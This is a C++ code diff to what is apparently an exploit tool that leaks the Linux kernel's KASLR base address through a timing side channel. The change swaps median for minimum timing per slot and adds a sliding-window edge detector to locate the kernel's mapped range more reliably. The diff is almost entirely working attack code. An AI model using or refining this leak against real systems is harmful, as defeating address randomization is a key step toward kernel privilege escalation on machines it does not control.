@@ -63,11 +63,9 @@ const uint64_t KASLR_SLOT_SIZE = 0x200000;
 
 const int KASLR_MAX_ATTEMPTS = 100;
 
-uint64_t compute_median(std::vector<uint64_t> v) {
-    assert(!v.empty() && "compute_median received an empty vector");
-    size_t n = v.size() / 2;
-    nth_element(v.begin(), v.begin() + n, v.end());
-    return v[n];
+uint64_t compute_min(const std::vector<uint64_t>& v) {
+    assert(!v.empty() && "compute_min received an empty vector");
+    return *std::min_element(v.begin(), v.end());
 }
 
 uint64_t abs_diff(uint64_t a, uint64_t b) {
@@ -76,24 +74,34 @@ uint64_t abs_diff(uint64_t a, uint64_t b) {
 
 uint64_t slot_to_addr(size_t slot);
 
-std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings) {
-    uint64_t median = compute_median(timings);
-    uint64_t max_diff = 0;
-    for (size_t slot = 0; slot < timings.size(); slot++) {
-        uint64_t diff = abs_diff(timings[slot], median);
-        if (diff > max_diff) {
-            max_diff = diff;
-        }
-    }
-    uint64_t threshold = max_diff / 2;
-
-    for (size_t slot = 0; slot < timings.size(); slot++) {
-        uint64_t diff = abs_diff(timings[slot], median);
-        if (diff >= threshold) {
-            return slot;
-        }
+std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings, int window_size) {
+    if (timings.size() < (size_t)window_size) {
+        return std::nullopt;
     }
 
+    std::vector<uint64_t> sorted_timings = timings;
+    size_t n = sorted_timings.size() / 2;
+    std::nth_element(sorted_timings.begin(), sorted_timings.begin() + n, sorted_timings.end());
+    uint64_t global_median = sorted_timings[n];
+
+    uint64_t max_sum_diff = 0;
+    std::optional<size_t> best_slot = std::nullopt;
+
+    for (size_t i = 0; i <= timings.size() - window_size; ++i) {
+        uint64_t current_sum_diff = 0;
+        for (int k = 0; k < window_size; ++k) {
+            current_sum_diff += abs_diff(timings[i + k], global_median);
+        }
+
+        if (!best_slot.has_value() || current_sum_diff > max_sum_diff) {
+            max_sum_diff = current_sum_diff;
+            best_slot = i;
+        }
+    }
+
+    if (best_slot.has_value()) {
+        return best_slot;
+    }
     return std::nullopt;
 }
 
@@ -148,7 +156,7 @@ uint64_t sidechannel(uint64_t addr) {
     return delta;
 }
 
-std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(int samples) {
+std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(int samples, int window_size) {
     size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
     std::vector<std::vector<uint64_t>> all_timings(slots);
     for (auto& t : all_timings) {
@@ -165,10 +173,10 @@ std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(in
 
     std::vector<uint64_t> timings(slots);
     for (size_t slot = 0; slot < slots; slot++) {
-        timings[slot] = compute_median(all_timings[slot]);
+        timings[slot] = compute_min(all_timings[slot]);
     }
 
-    std::optional<size_t> slot = try_find_edge(timings);
+    std::optional<size_t> slot = try_find_edge(timings, window_size);
     if (slot.has_value()) {
         return {slot_to_addr(*slot), timings};
     }
@@ -207,11 +215,11 @@ std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>
     return std::nullopt;
 }
 
-uint64_t leak_kaslr_base(int samples, int trials, std::vector<std::vector<uint64_t>>* debug_data) {
+uint64_t leak_kaslr_base(int samples, int trials, int window_size, std::vector<std::vector<uint64_t>>* debug_data) {
     std::vector<std::optional<uint64_t>> slots(trials);
     for (int attempt = 0; attempt < KASLR_MAX_ATTEMPTS; attempt++) {
         for (int trial = 0; trial < trials; trial++) {
-            auto result = try_leak_kaslr_base(samples);
+            auto result = try_leak_kaslr_base(samples, window_size);
             slots[trial] = result.first;
             if (debug_data) {
                  debug_data->push_back(result.second);
